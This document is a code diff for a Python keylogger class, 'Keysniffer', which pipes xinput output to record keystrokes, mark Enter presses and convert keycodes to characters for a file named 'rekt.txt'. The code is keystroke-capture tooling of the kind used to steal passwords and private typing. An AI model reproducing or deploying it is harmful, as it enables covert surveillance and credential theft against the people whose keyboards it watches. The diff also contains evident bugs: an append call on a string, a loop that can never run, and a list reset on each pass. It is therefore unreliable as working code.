@@ -5,10 +5,10 @@ import re
 
 
 class Keysniffer():
-        def __init__(self, xinput_bin='/usr/bin/xinput', outfile='rekt.txt'):
+        def __init__(self, xinput_bin='/usr/bin/xinput'):
                self.xinput = xinput_bin
                self.keycodes = []
-               self.outfile = outfile
+               self.outfile = 'rekt.txt'
                self.keyboards = self.getKeyboards()
 
                self.getKeyCodes()
@@ -130,31 +130,38 @@ class Keysniffer():
                 Execute xinput to begin sniffing keycodes. Fill a list buffer 
                 """
 
+                # Get the code for the Enter key so we know when newlines happen.
+                def get_enter_code(enter_code=''):
+                        for code in self.keycodes:
+                                if code[1] == '(Enter)':
+                                        enter_code.append(code[1])
+                                        break
+                                else:
+                                        continue
+                enter = get_enter_code()
+
                 # Call xinput to start sniffing keycodes and pipe its output 
                 keystream = subprocess.Popen((self.xinput, ), 
                                 stdout=subprocess.PIPE, 
                                 universal_newlines=True)
                 
-                # Create a list to hold keycodes, fill it with 4 keycodes at a time
-                enter_code = ''
-                for code in self.keycodes:
-                        if code[1] == '(Enter)':
-                                enter_code.append(code[1])
-                                break
-                        else:
-                                continue
                 
                 stream_buffer = []
                 for line in keystream.stdout:
                         while len(stream_buffer) > 64:
-                                if "release" in line and enter_code not in line:
+                                if "release" in line and enter not in line:
                                         code = str(line).strip().split()
                                         stream_buffer.append(code[-1])
-                                elif enter_code in line:
-                                        stream_buffer.append('<newline>')
+                                elif enter in line:
+                                        stream_buffer.append('<break>')
                                         break
                 
-                converted_stream = self.codesToKeys(stream_buffer)
+                raw_keys = self.codesToKeys(stream_buffer)
+                final_string = ''
+                for char in raw_keys:
+                        stripped_keys = []
+                        stripped_keys.append(char[1])
+
 
                 
                                         
